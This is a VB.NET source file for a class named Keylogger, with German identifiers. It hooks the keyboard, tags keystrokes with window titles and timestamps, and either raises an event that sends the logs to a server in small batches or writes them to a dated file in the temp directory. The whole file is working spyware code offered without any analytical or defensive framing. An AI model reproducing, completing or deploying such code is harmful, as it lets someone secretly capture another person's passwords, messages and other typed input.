Public Class Keylogger
    Public Event SendOnlinwLogsToServer(ByVal sLogs As String)

    Public WithEvents KeyboardHook As New KeyboardHook
    Dim Logs As String
    Dim IsOnlineKeylogger As Boolean
    Dim AktuellesFenster As String
    Dim NeuesFenster As String
    Public Sub NewWindow(ByVal Titel As String)
        NeuesFenster = Titel
    End Sub

    Public Sub StartOfflineKeylogger()
        KeyboardHook.Stopp()
        KeyboardHook.Start()
    End Sub
    Public Sub StartOnlinekeylogger()
        IsOnlineKeylogger = True
        KeyboardHook.Stopp()
        KeyboardHook.Start()
    End Sub
    Public Sub StopOnlineKeylogger()
        IsOnlineKeylogger = False
        KeyboardHook.Stopp()
    End Sub

    Private Sub KeyboardHook_KeyDown(ByVal sKey As String) Handles KeyboardHook.KeyDown
        Try
            If NeuesFenster <> AktuellesFenster Then
                If (IsOnlineKeylogger Or OffKeylogger) Then
                    Logs &= "[ENTER]" & Now.ToString("hh.mm.ss") & " Neues Fenster: " & NeuesFenster & "[ENTER]"
                End If
                AktuellesFenster = NeuesFenster
            End If

            Logs &= sKey

            If IsOnlineKeylogger Then
                If Logs.Length > 3 Then
                    RaiseEvent SendOnlinwLogsToServer(Logs)
                    Logs = Nothing
                End If
            Else
                If Logs.Length > 100 Then
                    My.Computer.FileSystem.WriteAllText(Environ("temp") & "\TMP-OFKGL_" & Now.Day & "." & Now.Month & "." & Now.Year, Logs, True)
                    Logs = Nothing
                End If
            End If
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try



    End Sub
End Class
